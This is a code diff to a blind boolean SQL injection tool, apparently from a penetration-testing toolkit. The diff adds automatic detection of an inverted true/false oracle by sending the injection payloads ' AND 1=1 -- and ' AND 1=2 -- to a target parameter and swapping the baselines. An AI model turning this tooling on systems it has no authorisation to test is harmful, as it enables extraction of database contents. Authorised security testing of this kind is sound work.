@@ -50,6 +50,7 @@ class BlindSqliBooleanTool:
         "or 'test_condition'), 'true_condition' (payload returning true), 'false_condition' "
         "(payload returning false), optional 'payload_template' for extraction, optional "
         "'query' (SQL query to extract from), optional 'position' (char position), "
+        "optional 'detect_oracle_inversion' (bool, auto-detect if oracle is inverted), "
         "optional 'data', 'headers', 'timeout'. Returns extracted data or condition result."
     )
 
@@ -278,6 +279,45 @@ class BlindSqliBooleanTool:
             return "\n".join(output_lines)
 
         output_lines.append("Baseline established - responses are distinguishable.")
+
+        # Oracle inversion detection
+        detect_inversion = data.get("detect_oracle_inversion", False)
+        oracle_inverted = False
+
+        if detect_inversion:
+            output_lines.append("")
+            output_lines.append("Detecting oracle inversion...")
+            output_lines.append("-" * 40)
+
+            # Send known-true and known-false conditions
+            known_true = "' AND 1=1 --"
+            known_false = "' AND 1=2 --"
+
+            kt_resp, kt_error = self._make_request(
+                url, method, param, known_true, form_data, headers, timeout
+            )
+            kf_resp, kf_error = self._make_request(
+                url, method, param, known_false, form_data, headers, timeout
+            )
+
+            if kt_error or kf_error:
+                output_lines.append("  Could not test oracle inversion (request error)")
+            elif kt_resp is not None and kf_resp is not None:
+                # If known-true matches the false baseline, oracle is inverted
+                kt_matches_true = self._responses_match(kt_resp, true_resp)
+                kt_matches_false = self._responses_match(kt_resp, false_resp)
+
+                output_lines.append(f"  Known-true (1=1) matches true baseline: {kt_matches_true}")
+                output_lines.append(f"  Known-true (1=1) matches false baseline: {kt_matches_false}")
+
+                if kt_matches_false and not kt_matches_true:
+                    oracle_inverted = True
+                    # Swap baselines
+                    true_resp, false_resp = false_resp, true_resp
+                    output_lines.append("  INVERTED ORACLE DETECTED! Swapping true/false baselines.")
+                else:
+                    output_lines.append("  Oracle is NORMAL (not inverted).")
+
         output_lines.append("")
 
         if operation == "test_condition":
